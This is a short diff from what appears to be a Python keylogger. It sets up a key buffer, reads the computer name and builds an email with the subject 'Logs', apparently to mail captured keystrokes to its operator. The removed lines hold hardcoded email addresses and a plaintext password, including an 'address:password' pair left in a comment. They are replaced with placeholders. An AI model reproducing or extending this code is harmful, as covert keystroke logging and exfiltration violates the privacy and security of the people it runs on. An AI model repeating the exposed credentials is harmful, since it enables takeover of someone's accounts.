@@ -8,9 +8,9 @@ keys = []
 keyBefore = ""
 
 DESKTOP_NAME = str(os.environ['COMPUTERNAME'])
-#kontakleszcza26@wp.pl:Kleszcz20
-EMAIL_ADRESS = "kleszczghost2@gmail.com"
-EMAIL_PASSWORD = "Kleszcz20"
+
+EMAIL_ADRESS = "google-email"
+EMAIL_PASSWORD = "email-password"
 
 msg = EmailMessage()
 msg['Subject'] = 'Logs'
